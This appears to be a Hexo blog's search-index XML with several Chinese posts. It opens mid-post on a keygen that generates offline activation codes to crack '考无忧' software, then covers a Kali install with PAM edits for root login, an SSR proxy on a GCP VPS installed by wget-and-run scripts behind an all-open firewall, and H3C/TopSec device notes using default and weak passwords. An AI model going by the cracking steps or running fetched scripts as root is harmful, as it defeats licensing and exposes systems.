//机器码</span><br><span class="line"></span><br><span class="line">	cal(machine, login, subject)</span><br></pre></td></tr></table></figure>

<h1 id="离线激活测试"><a href="#离线激活测试" class="headerlink" title="离线激活测试"></a>离线激活测试</h1><p>首先将软件禁止联网，转离线激活页，将<code>注册码</code>、<code>注册科目</code>、<code>机器码</code>分别复制到脚本中的<code>login</code>、<code>subject</code>、<code>machine</code>项，运行得到离线激活码，激活成功，重启即可。</p>
<p><img src="/1008/3.PNG"></p>
]]></content>
      <tags>
        <tag>考无忧</tag>
        <tag>破解</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x00】Kali Linux启动盘制作及物理机安装</title>
    <url>/1010/</url>
    <content><![CDATA[<p>Kali Linux 前身是著名渗透测试系统BackTrack ，是一个基于 <strong>Debian</strong> 的 Linux 发行版，包含很多安全和取证方面的相关工具。</p>
<p>Kali Linux 是一款非常不错的渗透测试系统，致力于做最优秀的渗透测试分发系统。</p>
<p>本文使用<strong>rufus</strong>制作kali的u盘启动盘并在本机上进行安装。</p>
<span id="more"></span>

<h1 id="镜像下载"><a href="#镜像下载" class="headerlink" title="镜像下载"></a>镜像下载</h1><p>Kali Linux 提供了多种类型的版本可供下载。可以在官方下载地址（<a href="https://www.kali.org/downloads/">https://www.kali.org/downloads/</a> ）中根据系统位数、ARM 硬件支持的各种版本中选择所需版本进行下载。</p>
<p><img src="/1010/1.PNG"></p>
<p>其中Light 版本是Kali Linux 基于64bit 的轻量级版本，保证系统的最小化安装和基本的使用；而e17、Mate、LXDE等是不同的桌面环境，支持GNOME、KDE、Mate、LXDE和Enlightenment等桌面环境。</p>
<p>因为轻量版里很多功能需要重新安装，一般下载完整版即可。</p>
<h1 id="启动盘制作"><a href="#启动盘制作" class="headerlink" title="启动盘制作"></a>启动盘制作</h1><p><strong>这里注意要使用rufus的dd模式进行刻盘，这样不会造成之后的media挂载问题。</strong></p>
<p>原本使用ultraISO等工具进行制作后，在安装过程中出现了media挂载问题，查询资料后尝试了多种方法仍无法解决，因此这里推荐使用rufus进行启动盘的制作。</p>
<p>打开rufus，选择镜像：</p>
<p><img src="/1010/2.PNG"></p>
<p>然后点击开始，选择<code>以DD镜像 模式写入</code>：</p>
<p><img src="/1010/3.PNG"></p>
<p>之后等待进度条即可。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>插上U盘，开机时按F12（不同品牌bios引导快捷键有所不同，自行百度查阅）进入单次引导选择界面，选择U盘启动盘盘符，进行Kali安装。</p>
<p>安装过程中一般按照默认选项即可，很多设置装好了也可以修改。</p>
<p><strong>注意：最后一步一定要选择第二个物理硬盘的选项，不能选默认的manually，否则会黑屏！</strong></p>
<h1 id="kali2020-20-06更新"><a href="#kali2020-20-06更新" class="headerlink" title="kali2020(20.06更新)"></a>kali2020(20.06更新)</h1><p>kali2020为了安全，取消了root用户的直接登录，这里有方法可以root登录，记录一下：</p>
<p><a href="https://blog.csdn.net/weixin_43894771/article/details/104757353">解决2020.1kali Linux的root账户无法登陆的问题：</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">终端输入 sudo passwd root</span><br><span class="line">su root</span><br><span class="line"></span><br><span class="line">sudo vi /etc/pam.d/gdm-autologin</span><br><span class="line"></span><br><span class="line">註釋行 “auth requied pam_succeed_if.so user != root quiet success”</span><br><span class="line"></span><br><span class="line">sudo vi /etc/pam.d/gdm-password</span><br><span class="line"></span><br><span class="line">註釋行 “auth requied pam_succeed_if.so user != root quiet success”</span><br><span class="line"></span><br><span class="line">然后reboot即可解决问题使用root账号登陆</span><br></pre></td></tr></table></figure>

<p><a href="http://hackergu.com/kali2020-1-root-color/">让root用户换上像kali用户的终端颜色：</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/kali   <span class="comment">#切换到kali用户下</span></span><br><span class="line"><span class="built_in">cp</span> .bashrc /root   <span class="comment">#将kali用户的.bashrc复制到root用户目录下</span></span><br><span class="line"><span class="built_in">cd</span> /root   <span class="comment">#回到root用户目录下</span></span><br><span class="line"><span class="built_in">cat</span> .bashrc   <span class="comment">#查看.bashrc文件是否被替换，若已替换则说明成功</span></span><br><span class="line"><span class="built_in">source</span> .bashrc   <span class="comment">#终端颜色替换成功</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>Kali</tag>
        <tag>rufus</tag>
      </tags>
  </entry>
  <entry>
    <title>Google Cloud Platform上一键搭建SSR &amp; BBR加速教程</title>
    <url>/1009/</url>
    <content><![CDATA[<p>之前搭在台湾机房的服务器莫名其妙被迁移到了香港，囧。。。</p>
<p>因为香港的服务器有个致命的问题，PAC模式下有较高几率无法正常访问谷歌。。。</p>
<p>因此只能重新搭建一个台湾机房的服务器，本文使用了teddysun的一键搭建命令，这里感谢这位大佬的全自动脚本，节省了大量的时间精力，10分钟畅游youtube！</p>
<span id="more"></span>

<h1 id="GCP账号申请"><a href="#GCP账号申请" class="headerlink" title="GCP账号申请"></a>GCP账号申请</h1><p>官网(<a href="https://cloud.google.com/free/">https://cloud.google.com/free/</a>) 注册即可，注意地区现在不能选择中国大陆了，原因似乎是大量大陆ip注册新账号薅谷歌赠金羊毛，逼着谷歌关掉大陆地区的申请。</p>
<p>不过也没关系，地区选择香港，绑定paypal，按要求把身份证照片上传，一般一天之内审核就会通过。</p>
<h1 id="修改防火墙规则"><a href="#修改防火墙规则" class="headerlink" title="修改防火墙规则"></a>修改防火墙规则</h1><p>访问<a href="https://console.cloud.google.com/networking/firewalls/list">https://console.cloud.google.com/networking/firewalls/list</a> ，选择创建防火墙规则，按图中设置将所有ip、端口均放行即可。</p>
<p><img src="/1009/1.PNG"></p>
<h1 id="创建VM实例"><a href="#创建VM实例" class="headerlink" title="创建VM实例"></a>创建VM实例</h1><p>访问 <a href="https://console.cloud.google.com/compute/instances">https://console.cloud.google.com/compute/instances</a> ,选择创建实例，按图填写设置。</p>
<p><img src="/1009/2.PNG"></p>
<ul>
<li>名称随便填</li>
<li>区域选台湾，地区据说是asia-east1-c更快，我没测试选了默认</li>
<li>机器类型选微型够用，有0.6G内存和1.7G内存可选，一般0.6G就够用了</li>
<li>启动磁盘选CentOS 7</li>
<li>防火墙允许HTTP、HTTPS流量，不过前面做了防火墙全局设置，这个不勾也没关系</li>
</ul>
<h1 id="安装BBR脚本"><a href="#安装BBR脚本" class="headerlink" title="安装BBR脚本"></a>安装BBR脚本</h1><p>实例创建好之后选择SSH连接，首先切换root用户：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br></pre></td></tr></table></figure>

<p>依次运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y wget</span><br><span class="line"></span><br><span class="line">wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x bbr.sh</span><br><span class="line"></span><br><span class="line">./bbr.sh</span><br></pre></td></tr></table></figure>

<p>安装完成后，脚本会提示需要重启VPS，输入 y 并回车后重启。</p>
<p>重启完成后，验证是否成功安装最新内核并开启 TCP BBR，输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -r</span><br></pre></td></tr></table></figure>

<p>查看内核版本，含有版本号（2019.5.6版本号为<code>5.0.13-1.el7.elrepo.x86_64</code>）就成功了。</p>
<p>输入下面的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl net.ipv4.tcp_available_congestion_control</span><br></pre></td></tr></table></figure>

<p>返回值一般为：<code> net.ipv4.tcp_available_congestion_control = cubic reno bbr</code></p>
<h1 id="一键安装SSR"><a href="#一键安装SSR" class="headerlink" title="一键安装SSR"></a>一键安装SSR</h1><p>依次运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x shadowsocks-all.sh</span><br><span class="line"></span><br><span class="line">./shadowsocks-all.sh 2&gt;&amp;1 | <span class="built_in">tee</span> shadowsocks-all.log</span><br></pre></td></tr></table></figure>

<p>出现提示信息，选择要安装的版本。推荐选<code>ShadowsocksR</code>，输入<code>2</code>， 回车</p>
<p><img src="/1009/3.PNG"></p>
<p>设置密码</p>
<p><img src="/1009/4.PNG"></p>
<p>设置端口，可选范围1-65535，建议4位以上， 注意避免常用端口22，80，443等</p>
<p><img src="/1009/5.PNG"></p>
<p>选择加密方式，一般默认<code>aes-256-cfb</code>即可</p>
<p><img src="/1009/6.PNG"></p>
<p>选择协议，同样默认<code>origin</code>即可</p>
<p><img src="/1009/7.PNG"></p>
<p>选择混淆方式，依旧默认<code>plain</code></p>
<p><img src="/1009/8.PNG"></p>
<p>然后按任意键开始安装</p>
<p><img src="/1009/9.PNG"></p>
<p>安装完成后提示成功，同时显示SSR的IP、端口、密码等相关配置</p>
<p><img src="/1009/10.jpg"></p>
<p>之后使用PC或手机端按照配置连接即可。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>Google云服务平台对新用户赠送300美元(香港地区是2,354.99港币)，可以免费使用1年，而搭建一台只是用来翻墙的VPS实际上每个月花销都不到20港币，这个赠金都足以新建很多台VPS了。这个活动似乎长期有效，只是新用户注册流程相比以前更严格一些。</p>
<p>同时GCP还有<code>速度快</code>、<code>低延迟</code>的优势，毕竟台湾机房就在厦门正对面的台湾省彰化县，TTL值要远低于Vultr、Linode等服务商。</p>
<p>综合来看，如果GCP羊毛每年都能稳定薅的话，那这个性价比就太高了。</p>
]]></content>
      <tags>
        <tag>SSR</tag>
        <tag>VPS</tag>
        <tag>GCP</tag>
        <tag>梯子</tag>
        <tag>翻墙</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day1 防火墙配置--H3C F1060】</title>
    <url>/1011/</url>
    <content><![CDATA[<p>信息网络培训学习第一天，今天主要学习了防火墙的相关配置。</p>
<p>本文学习H3C F1060的相关配置。由于在H3C模拟器中，F1060默认只能进行控制台访问，初始的默认用户与密码均是<strong>admin</strong>，可以通过下面的设置开启web访问，方便进行配置。</p>
<span id="more"></span>

<h1 id="建立网络拓扑"><a href="#建立网络拓扑" class="headerlink" title="建立网络拓扑"></a>建立网络拓扑</h1><p>首先确定本地网卡运行中（插着网线，以免模拟器检测不到网卡），然后在模拟器中连接防火墙与Host（本地主机）。</p>
<p>这里注意选择物理网卡，图示另一个选项是VirtualBox的虚拟网卡，<em>其实也可以在拓扑中连接虚拟网卡，在本地适配器选项中桥接该虚拟网卡与物理网卡，效果是一样的，只不过更麻烦一点。</em></p>
<p><img src="/1011/1.PNG"></p>
<h1 id="防火墙web配置"><a href="#防火墙web配置" class="headerlink" title="防火墙web配置"></a>防火墙web配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FW1&gt;system-view                        //进入全局视图</span><br><span class="line"></span><br><span class="line">[FW1]int g1/0/23    //接口ip，根据所连接的网卡进行改动</span><br><span class="line">[FW1-GigabitEthernet1/0/23]ip address 192.168.0.1 24 </span><br><span class="line">[FW1-GigabitEthernet1/0/23]quit</span><br><span class="line"></span><br><span class="line">[FW1]security-zone name Trust	 //安全域</span><br><span class="line">[FW1-security-zone-Trust]import int g1/0/23    //把接口加入安全域</span><br><span class="line">[FW1-security-zone-Trust]quit</span><br><span class="line"></span><br><span class="line">[FW1]object-policy ip manage	        //创建对象策略</span><br><span class="line">[FW1-object-policy-ip-manage]rule pass			//规则动作</span><br><span class="line">[FW1-object-policy-ip-manage]quit</span><br><span class="line"></span><br><span class="line">[FW1]zone-pair security source trust destination local      //域间应用</span><br><span class="line">[FW1-zone-pair-security-Trust-Local]object-policy apply ip manage</span><br><span class="line">[FW1-zone-pair-security-Trust-Local]quit</span><br><span class="line"></span><br><span class="line">[FW1]ip http enable			//启用http和https的功能</span><br><span class="line">[FW1]ip https enable </span><br><span class="line"></span><br><span class="line">[FW1]local-user admin class manage	//创建登入web的用户名和密码</span><br><span class="line">[FW1-luser-manage-admin]password simple admin </span><br><span class="line">[FW1-luser-manage-admin]service-type http https </span><br><span class="line">[FW1-luser-manage-admin]authorization-attribute user-role network-admin</span><br></pre></td></tr></table></figure>

<h1 id="web登录测试"><a href="#web登录测试" class="headerlink" title="web登录测试"></a>web登录测试</h1><p>先在本地适配器中设置与管理地址(<strong>192.168.0.1&#x2F;24</strong>)同段的ip，这里设置ip为192.168.0.101，掩码默认，网关可以不设。</p>
<p><img src="/1011/2.PNG"></p>
<p>然后在浏览器访问前面配置好的管理地址<a href="https://192.168.0.1/">https://192.168.0.1</a> ，一般会被拦截，选择高级选项中的继续访问即可。用户名与密码均是admin。</p>
<p><img src="/1011/3.PNG"></p>
<p>由于F1060默认deny一切流量，因此在拓扑中串接的防火墙默认配置下会导致全网不通。</p>
<p>可以在策略中加一条允许一切流量通行的安全策略（<strong>注意：该配置纯属为方便模拟器学习配置，实机中该配置会导致防火墙毫无意义。</strong>）</p>
<p><img src="/1011/4.PNG"></p>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>防火墙</tag>
        <tag>H3C</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day2 考试相关注意事项】</title>
    <url>/1013/</url>
    <content><![CDATA[<p>信息网络培训学习第二天，今天听信通中心的评委老师讲考试的一些细节和注意事项。</p>
<span id="more"></span>

<h1 id="考试注意事项"><a href="#考试注意事项" class="headerlink" title="考试注意事项"></a>考试注意事项</h1><ol>
<li>网线制作质量</li>
<li>连接设备串口线usb端口，注意到设备管理器确认com号</li>
<li>互联线缆、直通线、交叉线，是否有故障</li>
<li>按要求答题，备份、保存</li>
<li>做题速度</li>
<li>考卷不让写、画，草稿纸画拓扑图</li>
<li>不会的题目也要配基础信息配置</li>
<li>互联互通题目，<strong>pc防火墙要关闭</strong></li>
</ol>
<h1 id="考试范围"><a href="#考试范围" class="headerlink" title="考试范围"></a>考试范围</h1><ul>
<li>常见、实用操作</li>
<li>telnet</li>
<li>ssh</li>
<li>vlan（单臂路由、vlan间路由）</li>
<li>路由（静态、动态、重分发）&#x2F;&#x2F;ospf为主、rip小概率</li>
<li>stp</li>
<li>链路聚合</li>
<li>端口镜像</li>
<li>DHCP</li>
<li>dns</li>
<li>acl</li>
<li>nat</li>
<li>防火墙（基本配置、访问策略、路由）&#x2F;&#x2F;<em>三区域</em></li>
<li><em>IS-IS</em></li>
</ul>
]]></content>
      <tags>
        <tag>信息网络</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day3 H3C设备配置telnet】</title>
    <url>/1014/</url>
    <content><![CDATA[<p>信息网络培训学习第三天，今天在H3C交换机S5500实机（v5）及H3C交换机S5130（v7）模拟器上配置telnet。</p>
<p>本文分别记录在H3C v5和v7系统版本下的telnet配置命令。</p>
<span id="more"></span>

<h1 id="H3C-v5"><a href="#H3C-v5" class="headerlink" title="H3C v5"></a>H3C v5</h1><p>v5版本下telnet有三种模式，用户权限为level0~3。</p>
<h2 id="none"><a href="#none" class="headerlink" title="none"></a>none</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;H3C&gt;system-view</span><br><span class="line">[H3C]telnet server enable</span><br><span class="line">[H3C]user-interface vty 0 4</span><br><span class="line">[H3C-ui-vty0-4]authentication-mode none</span><br><span class="line">[H3C-ui-vty0-4]user privilege level 3</span><br></pre></td></tr></table></figure>

<p>登录测试：</p>
<p><img src="/1014/1.PNG"></p>
<h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;H3C&gt;system-view</span><br><span class="line">[H3C]telnet server enable</span><br><span class="line">[H3C]user-interface vty 0 4</span><br><span class="line">[H3C-ui-vty0-4]authentication-mode password</span><br><span class="line">[H3C-ui-vty0-4]set authentication password simple 123456 </span><br><span class="line">[H3C-ui-vty0-4]user privilege level 3</span><br></pre></td></tr></table></figure>

<p>登录测试：</p>
<p><img src="/1014/2.PNG"></p>
<h2 id="scheme"><a href="#scheme" class="headerlink" title="scheme"></a>scheme</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;H3C&gt;system-view</span><br><span class="line">[H3C]telnet server enable</span><br><span class="line">[H3C]user-interface vty 0 4</span><br><span class="line">[H3C-ui-vty0-4]authentication-mode scheme</span><br><span class="line">[H3C-ui-vty0-4]user privilege level 3</span><br><span class="line">[H3C-ui-vty0-4]quit</span><br><span class="line">[H3C]local-user admin</span><br><span class="line">[H3C-luser-admin]password simple 123456 //simple明文、cipher密文</span><br><span class="line">[H3C-luser-admin]service-type telnet</span><br><span class="line">[H3C-luser-admin]authorization-attribute user privilege level 3</span><br></pre></td></tr></table></figure>

<p>登录测试：</p>
<p><img src="/1014/3.PNG"></p>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ol>
<li>当权限设置为非3的时候，如果需要使用3级权限，可以配置超级密码</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C]super password level 3 cipher/simple ******</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>本地用户的密码相关配置</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C-luser-admin]password-control aging 10 //老化时间10天</span><br><span class="line">[H3C-luser-admin]password-control composition type-number 3 type-length 5 //密码元素的最少组合类型为3种，每种元素最少5个</span><br><span class="line">[H3C-luser-admin]password-control length 10 //最小长度为10</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>vty用户的超时配置</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C-ui-vty0-4]idle-timeout 5 30 //超时时间为5分30秒</span><br></pre></td></tr></table></figure>

<h1 id="H3C-v7"><a href="#H3C-v7" class="headerlink" title="H3C v7"></a>H3C v7</h1><p>v5版本下telnet有三种模式，用户权限为level0~15、network-admin、network-operator（缺省）。</p>
<h2 id="none-1"><a href="#none-1" class="headerlink" title="none"></a>none</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;H3C&gt;system-view</span><br><span class="line">[H3C]telnet server enable</span><br><span class="line">[H3C]line vty 0 4</span><br><span class="line">[H3C-line-vty0-4]authentication-mode none</span><br><span class="line">[H3C-line-vty0-4]user-role network-admin</span><br></pre></td></tr></table></figure>

<h2 id="password-1"><a href="#password-1" class="headerlink" title="password"></a>password</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;H3C&gt;system-view</span><br><span class="line">[H3C]telnet server enable</span><br><span class="line">[H3C]line vty 0 4</span><br><span class="line">[H3C-line-vty0-4]authentication-mode password</span><br><span class="line">[H3C-line-vty0-4]set authentication password simple 123456</span><br><span class="line">[H3C-line-vty0-4]user-role network-admin</span><br></pre></td></tr></table></figure>

<h2 id="scheme-1"><a href="#scheme-1" class="headerlink" title="scheme"></a>scheme</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;H3C&gt;system-view</span><br><span class="line">[H3C]telnet server enable</span><br><span class="line">[H3C]line vty 0 4  //与[H3C]user-interface vty 0 4效果一致</span><br><span class="line">[H3C-line-vty0-4]authentication-mode scheme</span><br><span class="line">[H3C-line-vty0-4]user-role network-admin</span><br><span class="line">[H3C-line-vty0-4]quit</span><br><span class="line">[H3C]local-user admin [class] [manage]//默认加入manage组</span><br><span class="line">[H3C-luser-manage-admin]password simple 123456  //simple明文、hash密文</span><br><span class="line">[H3C-luser-manage-admin]service-type telnet</span><br><span class="line">[H3C-luser-manage-admin]authorization-attribute user-role network-admin</span><br></pre></td></tr></table></figure>

<h2 id="其它-1"><a href="#其它-1" class="headerlink" title="其它"></a>其它</h2><ol>
<li>配置用户分级密码，使用<code>super &lt;level&gt;</code>命令切换权限</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C]super password role network-admin hash/simple ******</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>本地用户的密码相关配置</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C-luser-manage-admin]password-control aging 10 //老化时间10天</span><br><span class="line">[H3C-luser-manage-admin]password-control composition type-number 3 type-length 5 //密码元素的最少组合类型为3种，每种元素最少5个</span><br><span class="line">[H3C-luser-manage-admin]password-control length 10 //最小长度为10</span><br><span class="line">[H3C-luser-manage-admin]password-control login-attempt 5 //重复尝试登录次数为5</span><br><span class="line">[H3C-luser-manage-admin]password-control complexity same-character check //禁止密码中出现3个及以上重复字符串</span><br><span class="line">[H3C-luser-manage-admin]password-control complexity user-name check //禁止密码中出现用户名</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>vty用户的超时配置</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C-line-vty0-4]idle-timeout 5 30 //超时时间为5分30秒</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>telnet</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day4 H3C设备配置ssh】</title>
    <url>/1015/</url>
    <content><![CDATA[<p>信息网络培训学习第四天，今天在H3C交换机S5500实机（v5）及H3C交换机S5130（v7）模拟器上配置ssh。</p>
<p>本文分别记录在H3C v5和v7系统版本下的ssh配置命令。</p>
<span id="more"></span>

<h1 id="H3C-v5"><a href="#H3C-v5" class="headerlink" title="H3C v5"></a>H3C v5</h1><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C]ssh server enable //开启ssh服务</span><br><span class="line"></span><br><span class="line">[H3C]public-key local create rsa //生成RSA和DSA密钥对，默认1024位</span><br><span class="line">[H3C]public-key local create dsa //创建后，交换机重启后依然存在</span><br><span class="line"></span><br><span class="line">[H3C]user-interface vty 0 4</span><br><span class="line">[H3C-ui-vty0-4]authentication-mode scheme //ssh只支持scheme模式</span><br><span class="line">[H3C-ui-vty0-4]user privilege level 3 //设置vty权限</span><br><span class="line">[H3C-ui-vty0-4]protocol inbound ssh //（可选）只允许登录方式为ssh</span><br><span class="line">[H3C-ui-vty0-4]quit</span><br><span class="line"></span><br><span class="line">[H3C]local-user admin //创建本地用户</span><br><span class="line">[H3C-luser-admin]password simple 123456 //simple明文、cipher密文</span><br><span class="line">[H3C-luser-admin]service-type ssh //服务类型ssh</span><br><span class="line">[H3C-luser-admin]authorization-attribute level 3 //设置本地用户权限</span><br></pre></td></tr></table></figure>

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>配置管理vlan地址为<strong>192.168.1.1&#x2F;24</strong>，本地地址设置为<strong>192.168.1.2</strong>，在XShell中输入<code>ssh 192.168.1.1</code>连接交换机。</p>
<p><img src="/1015/1.PNG"></p>
<p><img src="/1015/2.PNG"></p>
<p>输入用户名与密码后成功登录交换机。</p>
<p><img src="/1015/3.PNG"></p>
<h1 id="H3C-v7"><a href="#H3C-v7" class="headerlink" title="H3C v7"></a>H3C v7</h1><h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[H3C]ssh server enable //开启ssh服务</span><br><span class="line"></span><br><span class="line">[H3C]public-key local create rsa //生成RSA和DSA密钥对，默认1024位</span><br><span class="line">[H3C]public-key local create dsa //创建后，交换机重启后依然存在</span><br><span class="line"></span><br><span class="line">[H3C]line vty 0 4</span><br><span class="line">[H3C-line-vty0-4]authentication-mode scheme //ssh只支持scheme模式</span><br><span class="line">[H3C-line-vty0-4]user-role network-admin //设置vty权限</span><br><span class="line">[H3C-line-vty0-4]protocol inbound ssh //（可选）只允许登录方式为ssh</span><br><span class="line">[H3C-line-vty0-4]quit</span><br><span class="line"></span><br><span class="line">[H3C]local-user admin //创建本地用户</span><br><span class="line">[H3C-luser-manage-admin]password simple 123456 //simple明文、cipher密文</span><br><span class="line">[H3C-luser-manage-admin]service-type ssh //服务类型ssh</span><br><span class="line">[H3C-luser-manage-admin]authorization-attribute user-role network-admin //设置本地用户权限</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>v5版本与v7版本的命令大致一致，区别主要在权限的配置命令上。</p>
<p>另外v5版本的vty只能开启&lt;0-4&gt;，而v7版本的vty可以开启&lt;0-63&gt;。</p>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day1 防火墙配置--天融信NGFW4000】</title>
    <url>/1012/</url>
    <content><![CDATA[<p>信息网络培训学习第一天，今天主要学习了防火墙的相关配置。</p>
<p>本文学习天融信NGFW4000的相关配置。NGFW4000的初始管理员用户名是<strong>superman</strong>，密码是<strong>talent</strong>，可以通过网线连接eth0口，并将本机ip设为<strong>192.168.1.254&#x2F;24</strong>网段中的其他ip，通过浏览器访问**<a href="https://192.168.1.254/">https://192.168.1.254</a> **进行web配置。</p>
<span id="more"></span>

<h1 id="主界面"><a href="#主界面" class="headerlink" title="主界面"></a>主界面</h1><p>web登录防火墙管理界面后，可以在主界面看到许多可以配置的属性。</p>
<p>工作中一般需要学习配置的属性有网络管理、资源管理、防火墙等，其他不是很常用，这里暂不学习。</p>
<p><img src="/1012/1.PNG"></p>
<p>这里使用下面的拓扑来学习防火墙的相关设置。</p>
<p><img src="/1012/28.PNG"></p>
<h1 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h1><h2 id="接口配置"><a href="#接口配置" class="headerlink" title="接口配置"></a>接口配置</h2><p>找到对应物理接口，编辑IP地址即可。</p>
<p>这里要注意的是，eth0网卡默认网段是<strong>192.168.1.254&#x2F;24</strong>，似乎不可以修改。</p>
<p>这里分别给eth2、eth3口配置拓扑图中ip及掩码。点击添加后确定即可。</p>
<p><img src="/1012/2.PNG"></p>
<p><img src="/1012/3.PNG"></p>
<h2 id="路由配置"><a href="#路由配置" class="headerlink" title="路由配置"></a>路由配置</h2><h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><p>静态路由的配置在<code>路由表</code>项中直接添加路由即可，其中网关即下一跳，接口即出接口。</p>
<p>这里配置来去两条静态路由，目的地址如果是0.0.0.0&#x2F;0.0.0.0的话，该静态路由即缺省路由。</p>
<p><img src="/1012/4.PNG"></p>
<p><img src="/1012/5.PNG"></p>
<h3 id="ospf"><a href="#ospf" class="headerlink" title="ospf"></a>ospf</h3><p>ospf的设置在<code>动态路由ospf</code>选项卡下，启动后在下方区域配置中可以添加运行网段。</p>
<p><img src="/1012/6.PNG"></p>
<p>这里启用防火墙直连两个网段，区域设置为1。</p>
<p><img src="/1012/7.PNG"></p>
<p><img src="/1012/8.PNG"></p>
<p>配置后也可以点击<code>动态路由ospf</code>选项卡下的<code>查看</code>按钮，来查看ospf的配置等控制台信息。</p>
<p><img src="/1012/9.PNG"></p>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>天融信防火墙还可以启用<strong>策略路由</strong>、<strong>动态路由RIP</strong>、<strong>多播路由</strong>等功能，由于工作中不常用，这里暂且略过。</p>
<h2 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h2><p>DHCP在<code>DHCP服务器</code>选项卡下配置。选择运行的物理接口后，要先添加地址池，然后启动即可。</p>
<p><img src="/1012/10.PNG"></p>
<p>这里在eth1卡上启用DHCP服务，子网为<strong>10.0.0.0&#x2F;24</strong>，分配地址段为<strong>10.0.0.5-10.0.0.10</strong>，网关配置<strong>10.0.0.2</strong>，这里需要注意，<em><strong>如果配置了网关且网关ip在分配地址段中，则自动排除网关ip的下发。</strong></em></p>
<p><img src="/1012/11.PNG"></p>
<p>配置完成后可以看到，DHCP服务已经启用，点击<code>查看分配地址</code>可以看到已经分配到ip地址的终端的相关信息。</p>
<p><img src="/1012/12.PNG"></p>
<h1 id="资源管理"><a href="#资源管理" class="headerlink" title="资源管理"></a>资源管理</h1><h2 id="地址配置"><a href="#地址配置" class="headerlink" title="地址配置"></a>地址配置</h2><p><code>地址配置</code>下，可以对单一IP、IP段、子网及混合组合进行自定义添加，便于资源管理。</p>
<p><img src="/1012/13.PNG"></p>
<h3 id="主机"><a href="#主机" class="headerlink" title="主机"></a>主机</h3><p>单一IP地址的添加在<code>主机</code>选项卡下。设置名称（便于记忆，无实际意义）后，添加ip地址即可。</p>
<p>这里似乎可以添加多个地址，没有尝试，不清楚。</p>
<p><img src="/1012/14.PNG"></p>
<h3 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h3><p>IP地址段的添加在<code>范围</code>选项卡下。设置名称（便于记忆，无实际意义）后，填写起止地址，同时也可以添加排除地址。</p>
<p><img src="/1012/15.PNG"></p>
<h3 id="子网"><a href="#子网" class="headerlink" title="子网"></a>子网</h3><p>IP子网段的添加在<code>子网</code>选项卡下。设置名称（便于记忆，无实际意义）后，填写子网地址及掩码，同时也可以添加排除地址。</p>
<p><img src="/1012/16.PNG"></p>
<p>这里将拓扑中两个内外网段添加后，可以看到这两个网段已出现在列表中。</p>
<p><img src="/1012/17.PNG"></p>
<h3 id="地址组"><a href="#地址组" class="headerlink" title="地址组"></a>地址组</h3><p>多IP混合组合的添加在<code>地址组</code>选项卡下。设置名称（便于记忆，无实际意义）后，添加在前面选项卡配置过的主机、范围、子网等即可。</p>
<p><img src="/1012/18.PNG"></p>
